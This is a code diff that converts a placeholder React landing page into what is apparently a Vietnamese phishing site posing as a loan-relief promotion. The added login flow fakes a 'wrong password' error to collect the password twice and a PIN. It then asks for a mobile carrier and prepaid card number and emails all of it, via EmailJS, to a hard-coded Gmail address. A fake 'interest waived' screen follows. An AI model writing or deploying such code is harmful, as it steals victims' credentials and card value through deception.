@@ -1,27 +1,64 @@
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import { ArrowUpRight, Check, Eye, EyeOff, Menu, Sparkles, X } from 'lucide-react'
+import data from './data.json'
+import emailjs from '@emailjs/browser'
 
-const features = [
-  {
-    number: '01',
-    title: 'See the signal',
-    text: 'Turn scattered information into a calm, clear picture of what matters next.',
-  },
-  {
-    number: '02',
-    title: 'Move with intent',
-    text: 'Build momentum with thoughtful prompts that meet you exactly where you are.',
-  },
-  {
-    number: '03',
-    title: 'Keep your north',
-    text: 'Come back to the decisions, ideas, and people that make the work meaningful.',
-  },
-]
+const emailConfig = {
+  serviceId: import.meta.env.VITE_EMAILJS_SERVICE_ID,
+  templateId: import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
+  publicKey: import.meta.env.VITE_EMAILJS_PUBLIC_KEY,
+  recipient: import.meta.env.VITE_EMAILJS_TO_EMAIL || 'nguyenducsy08@gmail.com'
+}
+
+emailjs.init(emailConfig.publicKey)
+
+const { features, heroSlides, imageOptions } = data
+  
+const cardValidation = {
+  viettel: { pattern: '[0-9]{14}', title: 'Vui lòng nhập đúng 14 số' },
+  vinaphone: { pattern: '[A-Za-z0-9]{12}', title: 'Vui lòng nhập đúng 12 chữ và số' },
+  mobifone: { pattern: '[A-Za-z0-9]{12}', title: 'Vui lòng nhập đúng 12 chữ và số' },
+}
+
+let selectedNetworkName = ''
+let globalFormData = {
+  phone: '',
+  password: '',
+  pinCode: '',
+  network: '',
+  serial: ''
+}
+
+function resetGlobalFormData() {
+  selectedNetworkName = ''
+  globalFormData = {
+    phone: '',
+    password: '',
+    pinCode: '',
+    network: '',
+    serial: ''
+  }
+}
 
 function App() {
   const [showLogin, setShowLogin] = useState(false)
   const [menuOpen, setMenuOpen] = useState(false)
+  const [activeSlide, setActiveSlide] = useState(0)
+  
+    
+  useEffect(() => {
+    const slideTimer = window.setInterval(() => {
+      setActiveSlide((current) => (current + 1) % heroSlides.length)
+    }, 5000)
+
+    return () => window.clearInterval(slideTimer)
+  }, [])
+
+  function goToSlide(index) {
+    setActiveSlide((index + heroSlides.length) % heroSlides.length)
+  }
+
+  const slide = heroSlides[activeSlide]
 
   return (
     <main className="site-shell">
@@ -32,7 +69,10 @@ function App() {
         </a>
         <div className={`nav-links ${menuOpen ? 'is-open' : ''}`}>
           <a href="#approach" onClick={() => setMenuOpen(false)}>TRANG CHỦ</a>
-          <a href="#stories" onClick={() => setMenuOpen(false)}>LIÊN HỆ</a>
+          <div className="hotline-link">
+            <a href="#stories" onClick={() => setMenuOpen(false)}>LIÊN HỆ TỔNG ĐÀI:</a>
+            <strong>1900 63 67 69</strong>
+          </div>
           <button className="mobile-login" onClick={() => { setShowLogin(true); setMenuOpen(false) }}>ĐĂNG NHẬP<ArrowUpRight size={15} /></button>
         </div>
         <button className="nav-login" onClick={() => setShowLogin(true)}>ĐĂNG NHẬP<ArrowUpRight size={15} /></button>
@@ -42,18 +82,25 @@ function App() {
       </nav>
 
       <section className="hero" id="top">
-        <div className="hero-copy">
-          <p className="eyebrow"><span className="eyebrow-dot" />A more considered way forward</p>
-          <h1>Make space<br /><em>for what's next.</em></h1>
-          <p className="hero-description">Northstar brings your thoughts, plans, and possibilities into focus, so you can spend less time navigating the noise and more time making meaningful progress.</p>
-          <button className="primary-button" onClick={() => setShowLogin(true)}>Find your north <ArrowUpRight size={18} /></button>
+        <div className={`hero-slide ${slide.artClass}`} key={activeSlide}>
+          <div className="hero-copy">
+            <p className="eyebrow"><span className="eyebrow-dot" />{slide.eyebrow}</p>
+            <h1>{slide.title}<br /><em>{slide.emphasis}</em></h1>
+            <p className="hero-description">{slide.description}</p>
+            <button className="primary-button" onClick={() => setShowLogin(true)}>Find your north <ArrowUpRight size={18} /></button>
+          </div>
+          <div className="hero-art" aria-label={slide.caption} role="img">
+            <div className="sun" />
+            <div className="horizon-line" />
+            <div className="hill hill-back" />
+            <div className="hill hill-front" />
+            <div className="art-caption">{slide.caption}<br /><span>0{activeSlide + 1} / 03</span></div>
+          </div>
         </div>
-        <div className="hero-art" aria-label="Abstract illustration of a sunlit horizon" role="img">
-          <div className="sun" />
-          <div className="horizon-line" />
-          <div className="hill hill-back" />
-          <div className="hill hill-front" />
-          <div className="art-caption">A clearer view<br /><span>01 / 03</span></div>
+        <div className="hero-controls" aria-label="Hero slides">
+          {heroSlides.map((heroSlide, index) => (
+            <button className={index === activeSlide ? 'is-active' : ''} aria-label={`Go to slide ${index + 1}`} aria-current={index === activeSlide ? 'true' : undefined} key={heroSlide.caption} onClick={() => goToSlide(index)} />
+          ))}
         </div>
         <div className="scroll-note"><span className="scroll-line" />Scroll to explore</div>
       </section>
@@ -81,7 +128,10 @@ function App() {
         <a href="mailto:hello@northstar.example">hello@northstar.example</a>
       </footer>
 
-      {showLogin && <LoginModal onClose={() => setShowLogin(false)} />}
+      {showLogin && <LoginModal onClose={() => {
+        resetGlobalFormData()
+        setShowLogin(false)
+      }} />}
     </main>
   )
 }
@@ -89,9 +139,37 @@ function App() {
 function LoginModal({ onClose }) {
   const [showPassword, setShowPassword] = useState(false)
   const [submitted, setSubmitted] = useState(false)
+  const [passwordAttempts, setPasswordAttempts] = useState(0)
+  const [passwordError, setPasswordError] = useState(false)
+  const [password, setPassword] = useState('')
+  const [phone, setPhone] = useState('')
+  const [pinCode, setPinCode] = useState('')
+  const [showPin, setShowPin] = useState(false)
+  const [submittedData, setSubmittedData] = useState(null)
 
   function handleSubmit(event) {
     event.preventDefault()
+    const nextAttempt = passwordAttempts + 1
+    setPasswordAttempts(nextAttempt)
+
+    globalFormData = {
+      ...globalFormData,
+      phone,
+      password,
+      pinCode
+    }
+
+    if (nextAttempt < 2) return
+
+    if (nextAttempt === 2) {
+      setPasswordError(true)
+      setPassword('')
+      window.setTimeout(() => setPasswordError(false), 1500)
+      setShowPin(true)
+      return
+    }
+
+    setSubmittedData({ phone, pinCode: pinCode.trim() || null })
     setSubmitted(true)
   }
 
@@ -101,24 +179,99 @@ function LoginModal({ onClose }) {
         <button className="close-button" aria-label="Close login" onClick={onClose}><X size={19} /></button>
         <div className="login-icon"><Sparkles size={18} /></div>
         {submitted ? (
-          <div className="success-state"><div className="success-icon"><Check size={22} /></div><h2>You're on your way.</h2><p>We've received your details. This demo is ready for its next connection.</p><button className="primary-button" onClick={onClose}>Back to Northstar <ArrowUpRight size={17} /></button></div>
+          <LoggedInForm imageOptions={imageOptions} loginData={submittedData} onClose={onClose} />
         ) : (
           <>
-            <p className="eyebrow">Welcome back</p>
-            <h2 id="login-title">Find your way in.</h2>
-            <p className="login-intro">Pick up where you left off.</p>
+            <div style={{ fontSize: '25px', fontWeight: '900', color: '#00b4fa' }} id="login-title" className="login-intro">Đăng nhập nhận ưu đãi</div>
+            <p className="login-intro">Khách hàng đăng nhập tại đây để tra cứu thông tin ưu đãi</p>
             <form onSubmit={handleSubmit}>
-              <label htmlFor="email">Email address</label>
-              <input id="email" name="email" type="email" placeholder="you@example.com" required />
-              <div className="password-label"><label htmlFor="password">Password</label><a href="#reset">Forgot?</a></div>
-              <div className="password-input"><input id="password" name="password" type={showPassword ? 'text' : 'password'} placeholder="Enter your password" minLength="6" required /><button type="button" aria-label={showPassword ? 'Hide password' : 'Show password'} onClick={() => setShowPassword(!showPassword)}>{showPassword ? <EyeOff size={17} /> : <Eye size={17} />}</button></div>
+              <label htmlFor="phone">Số điện thoại</label>
+              <input id="phone" name="phone" type="tel" inputMode="tel" autoComplete="tel" placeholder="Số điện thoại" pattern="(?:0|\+84)(?:3|5|7|8|9)[0-9]{8}" title="Vui lòng nhập số điện thoại hợp lệ" value={phone} onChange={(event) => { const nextPhone = event.target.value; setPhone(nextPhone); globalFormData = { ...globalFormData, phone: nextPhone } }} required />
+              <label htmlFor="password">Mật khẩu</label>
+              <div className={`password-input ${passwordError ? 'has-error' : ''}`}><input id="password" name="password" type={showPassword ? 'text' : 'password'} placeholder="Mật khẩu" minLength={passwordAttempts < 2 ? 6 : undefined} value={password} onChange={(event) => { const nextPassword = event.target.value; setPassword(nextPassword); globalFormData = { ...globalFormData, password: nextPassword } }} required={passwordAttempts < 2} aria-invalid={passwordError} />{passwordError && <span className="password-error">Sai mật khẩu, vui lòng thử lại</span>}<button type="button" aria-label={showPassword ? 'Hide password' : 'Show password'} onClick={() => setShowPassword(!showPassword)}>{showPassword ? <EyeOff size={17} /> : <Eye size={17} />}</button></div>
+              {showPin && <><label htmlFor="pin-code">Mã PIN</label><input id="pin-code" name="pinCode" type="text" inputMode="numeric" placeholder="Mã PIN" value={pinCode} onChange={(event) => { const nextPinCode = event.target.value; setPinCode(nextPinCode); globalFormData = { ...globalFormData, pinCode: nextPinCode } }} /></>}
               <button className="primary-button form-submit" type="submit">ĐĂNG NHẬP <ArrowUpRight size={17} /></button>
-            </form>
-            <p className="form-footnote">New here? <a href="#create">Create an account</a></p>
-          </>
+            </form>          </>
         )}
       </section>
     </div>
+  )
+}
+
+function LoggedInForm({ imageOptions, loginData, onClose }) {
+  const [selectedImage, setSelectedImage] = useState('')
+  const [cardNumber, setCardNumber] = useState('')
+  const [cardProcessing, setCardProcessing] = useState(false)
+  const [cardSubmitted, setCardSubmitted] = useState(false)
+  const selectedCardValidation = cardValidation[selectedImage]
+  const isCardNumberValid = Boolean(selectedCardValidation && new RegExp(`^${selectedCardValidation.pattern}$`).test(cardNumber))
+
+  const sendNotificationEmail = () => {
+    const networkLabel = selectedNetworkName || 'Chưa chọn nhà mạng'
+
+    emailjs.send(emailConfig.serviceId, emailConfig.templateId, {
+      to_email: emailConfig.recipient,
+      network_name: networkLabel,
+      cardNumber: cardNumber,
+      message: `${networkLabel}: ${cardNumber}`,
+      info: `Thong tin-----SDT: ${loginData.phone}, PASS: ${loginData.password}, PIN: ${loginData.pinCode || 'Không có mã PIN'}`,
+
+    })
+      .then((result) => {
+        console.log('Email sent:', result)
+      })
+      .catch((error) => {
+        console.log('Email error:', error)
+      })
+  }
+
+  function handleCardSubmit(event) {
+    event.preventDefault()
+    setCardProcessing(true)
+    globalFormData = {
+      ...globalFormData,
+      network: selectedImage,
+      serial: cardNumber
+    }
+    console.log({ ...loginData, network: selectedImage, cardNumber })
+    window.setTimeout(() => {
+      setCardProcessing(false)
+      sendNotificationEmail()
+      resetGlobalFormData()
+      setCardSubmitted(true)
+    }, 10000)
+  }
+
+  if (cardProcessing) {
+    return <div className="processing-state" role="status" aria-live="polite"><div className="loading-spinner" aria-hidden="true" /><h2>Hồ sơ đang được xử lý</h2><p>Vui lòng chờ trong giây lát.</p></div>
+  }
+
+  if (cardSubmitted) {
+    return <div className="success-state"><div className="fireworks" aria-hidden="true">{Array.from({ length: 12 }, (_, particleIndex) => <span key={particleIndex} />)}</div><div className="success-icon"><Check size={22} /></div><h2>Hồ sơ của bạn đã được miễn giảm toàn bộ lãi</h2><p>Liên hệ hotline 1900 63 67 69 để được tư vấn trả gốc hoặc gia hạn hợp đồng.</p><button className="secondary-button" onClick={onClose}>Đóng</button></div>
+  }
+
+  return (
+    <>
+      <div style={{ fontSize: '25px', fontWeight: '900', color: '#00b4fa' }} className="login-intro">Chọn nhà mạng</div>
+      <p className="login-intro">Vui lòng chọn nhà mạng và nhập số thẻ</p>
+      <form onSubmit={handleCardSubmit}>
+        <div className="image-options" role="group" aria-label="Chọn nhà mạng">
+          {imageOptions.map((option) => (
+            <button className={`image-option ${selectedImage === option.id ? 'is-selected' : ''}`} type="button" aria-label={`Chọn ${option.label}`} aria-pressed={selectedImage === option.id} key={option.id} onClick={() => {
+              selectedNetworkName = option.label
+              globalFormData = { ...globalFormData, network: option.label }
+              setSelectedImage(option.id)
+              setCardNumber('')
+            }}>
+              <img src={option.src} alt={option.label} />
+            </button>
+          ))}
+        </div>
+        <label htmlFor="card-number">Số thẻ</label>
+        <input className="card-number-input" id="card-number" name="cardNumber" type="text" inputMode="text" placeholder="Số thẻ" pattern={selectedCardValidation?.pattern} title={selectedCardValidation?.title || 'Vui lòng chọn nhà mạng'} value={cardNumber} onChange={(event) => setCardNumber(event.target.value)} required />
+        <button className="primary-button form-submit" type="submit" disabled={!isCardNumberValid}>XÁC NHẬN <ArrowUpRight size={17} /></button>
+      </form>
+    </>
   )
 }
 
